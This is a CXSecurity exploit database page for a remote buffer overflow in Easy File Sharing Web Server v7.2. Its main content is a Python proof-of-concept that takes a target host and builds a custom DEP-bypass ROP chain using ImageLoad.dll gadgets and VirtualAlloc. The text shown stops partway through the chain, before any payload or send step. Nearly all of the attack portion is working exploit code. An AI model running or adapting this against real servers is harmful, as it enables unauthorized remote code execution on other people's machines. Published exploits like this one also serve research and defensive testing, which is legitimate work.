---
title: Easy File Sharing Web Server v7.2 Buffer Overflow
url: https://cxsecurity.com/issue/WLB-2026040010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-04-14
fetch_date: 2026-04-15T04:42:40.468705
---

# Easy File Sharing Web Server v7.2 Buffer Overflow

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Easy File Sharing Web Server v7.2 Buffer Overflow** **2026.04.14**  Credit:  **[Donwor](https://cxsecurity.com/author/Donwor/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-119](https://cxsecurity.com/cwe/CWE-119 "Click to see CWE-119")** | |

# Exploit title: Easy File Sharing Web Server v7.2 - Buffer Overflow
# Date: 16/10/2025
# Exploit Author: Donwor
# X: @real\_Donwor
# Discord: Donwor
# Website: https://github.com/D0nw0r
# Software Link: https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe
# Version: Easy File Sharing Web Server v7.2
# Tested on: Windows 10,11
#
# Notes:
# - I wanted to re-do other PoCs because I did not want to use mona rop chain, so instead I built my own for practice and I believe it can help others.
# - The ROP chain was VERY challenging to build, mainly because there were a lot of limimitations when moving data between for example EAX and ESI
# - based on DEP SEH buffer overflow exploit by Knaps (https://www.exploit-db.com/exploits/38829/)
# - bad chars: '\x00' and '\x3b'
import struct, sys, socket
host = sys.argv[1]
port = 80
size = 5000
rop = struct.pack("<I", 0x1001ba81) # # MOV EAX,EBP # POP EDI # POP ESI # POP EBP # RETN \*\* [ImageLoad.dll] \*\* | {PAGE\_EXECUTE\_READ}
rop += struct.pack("<I", 0x41414141) # junk for pop edi
rop += struct.pack("<I", 0x41414141) # junk for pop edi
rop += struct.pack("<I", 0x41414141) # junk for ebp
rop += struct.pack("<I", 0x1001db66) # : # POP ESI # RETN \*\* [ImageLoad.dll] \*\* | {PAGE\_EXECUTE\_READ}
rop += struct.pack("<I", 0xffffeff8) # pop esi to align eax, will point after the hybjks
rop += struct.pack("<I", 0x10022f45) # # SUB EAX,ESI # POP EDI # POP ESI # RETN \*\* [ImageLoad.dll] \*\* | ascii {PAGE\_EXECUTE\_READ}
rop += struct.pack("<I", 0x41414141) # # SUB EAX,ESI # POP EDI # POP ESI # RETN \*\* [ImageLoad.dll] \*\* | ascii {PAGE\_EXECUTE\_READ}
rop += struct.pack("<I", 0x41414141) # # SUB EAX,ESI # POP EDI # POP ESI # RETN \*\* [ImageLoad.dll] \*\* | ascii {PAGE\_EXECUTE\_READ}
rop += struct.pack("<L", 0x61c0a798) # XCHG EAX,EDI # RETN )
rop += struct.pack("<L", 0x1001d626) # : # XOR ESI,ESI # RETN \*\* [ImageLoad.dll] \*\* | {PAGE\_EXECUTE\_READ}
rop += struct.pack("<L", 0x10021a3e) # (RVA : 0x00021a3e) : # ADD ESI,EDI # RETN 0x00 \*\* [ImageLoad.dll] \*\* | ascii {PAGE\_EXECUTE\_READ}
## Save ESP on ESI and EDI
rop += struct.pack("<L", 0x10015442) # : # POP EAX # RETN
rop += struct.pack("<L", 0x1004D1FC) # VirtualAlloc Addr on IAT
rop += struct.pack("<L", 0x1002248c) # deref VirtualAlloc : # MOV EAX,DWORD PTR [EAX] # RETN \*\* [ImageLoad.dll] \*\* | {PAGE\_EXECUTE\_READ}
rop += struct.pack("<L", 0x1001a8e3) # put virtualalloc addr on stack # MOV DWORD PTR [ESI],EAX # OR EAX,0FFFFFFFF # POP ESI # POP EBX # RETN \*\* [ImageLoad.dll] \*\* | {PAGE\_EXECUTE\_READ}
rop += struct.pack("<L", 0x41414141) # junk pop esi
rop += struct.pack("<L", 0x41414141) # junk pop ebx
rop += struct.pack("<L", 0x1001d626) # prepare esi for another round XOR ESI,ESI # RETN \*\* [ImageLoad.dll] \*\* | {PAGE\_EXECUTE\_READ}
rop += struct.pack("<L", 0x10021a3e) # put original stack pointer in esi(RVA : 0x00021a3e) : # ADD ESI,EDI # RETN 0x00 \*\* [ImageLoad.dll] \*\* | ascii {PAGE\_EXECUTE\_READ}
rop += struct.pack("<L", 0x1001715d) # increase esi to point 4 bytes more (next arg) (RVA : 0x0001715d) : # INC ESI # ADD AL,3A # RETN \*\* [ImageLoad.dll] \*\* | ascii {PAGE\_EXECUTE\_READ}
rop += struct.pack("<L", 0x1001715d) #
rop += struct.pack("<L", 0x1001715d) #
rop += struct.pack("<L", 0x1001715d) #
# Virtual Alloc on stack
# Esi now has "SRP" we need to fill it
# EDI still points to orignal one (Virtual alloc)
rop += struct.pack("<L", 0x1001f595) # Put SRP addr on eax MOV EAX,ESI # POP ESI # RETN \*\* [ImageLoad.dll] \*\* | {PAGE\_EXECUTE\_READ}
rop += struct.pack("<L", 0x41414141) # junk pop esi
rop += struct.pack("<L", 0x10019457) # ADD EAX,20 # RETN
rop += struct.pack("<L", 0x10019457) # ADD EAX,20 # RETN
rop += struct.pack("<L", 0x10019457) # ADD EAX,20 # RETN
rop += struct.pack("<L", 0x10019457) # ADD EAX,20 # RETN
rop += struct.pack("<L", 0x10019457) # ADD EAX,20 # RETN
rop += struct.pack("<L", 0x10019457) # ADD EAX,20 # RETN
rop += struct.pack("<L", 0x10019457) # ADD EAX,20 # RETN
rop += struct.pack("<L", 0x10019457) # ADD EAX,20 # RETN
rop += struct.pack("<L", 0x10019457) # ADD EAX,20 # RETN
rop += struct.pack("<L", 0x10019457) # ADD EAX,20 # RETN
rop += struct.pack("<L", 0x10019457) # ADD EAX,20 # RETN
rop += struct.pack("<L", 0x10019457) # ADD EAX,20 # RETN
rop += struct.pack("<L", 0x10019457) # ADD EAX,20 # RETN
rop += struct.pack("<L", 0x10019457) # eax now points to x more (can be changed)
rop += struct.pack("<L", 0x1001d626) # prepare esi for another round XOR ESI,ESI # RETN \*\* [ImageLoad.dll] \*\* | {PAGE\_EXECUTE\_READ}
rop += struct.pack("<L", 0x10021a3e) # put original stack pointer in esi # ADD ESI,EDI # RETN 0x00 \*\* [ImageLoad.dll] \*\* | ascii {PAGE\_EXECUTE\_READ}
rop += struct.pack("<L", 0x1001e80b) # This immedeately patches SRP and VirtualAlloc 1st arg! MOV DWORD PTR [ESI+8],EAX # MOV DWORD PTR [ESI+4],EAX # POP ESI # RETN \*\* [ImageLoad.dll] \*\* | {PAGE\_EXECUTE\_READ}
rop += struct.pack("<L", 0x41414141) # junk pop esi
# Virtual alloc | SRP | Shellcode Addr
# edi -> virtualalloc
rop += struct.pack("<L", 0x1001d626) # prepare esi for another round XOR ESI,ESI # RETN \*\* [ImageLoad.dll] \*\* | {PAGE\_EXECUTE\_READ}
rop += struct.pack("<L", 0x10021a3e) # put original stack pointer in esi # ADD ESI,EDI # RETN 0x00 \*\* [ImageLoad.dll] \*\* | ascii {PAGE\_EXECUTE\_READ}
rop += struct.pack("<L", 0x1001715d) # increase esi to point 12 bytes more (->dwsize) # INC ESI # ADD AL,3A # RETN \*\* [ImageLoad.dll] \*\* | ascii {PAGE\_EXECUTE\_READ}
rop += struct.pack("<L", 0x1001715d) #
rop += struct.pack("<L", 0x1001715d) #
rop += struct.pack("<L", 0x1001715d) #
rop += struct.pack("<L", 0x1001715d) #
rop += struct.pack("<L", 0x1001715d) #
rop += struct.pack("<L", 0x1001715d) #
rop += struct.pack("<L", 0x1001715d) #
rop += struct.pack("<L", 0x1001715...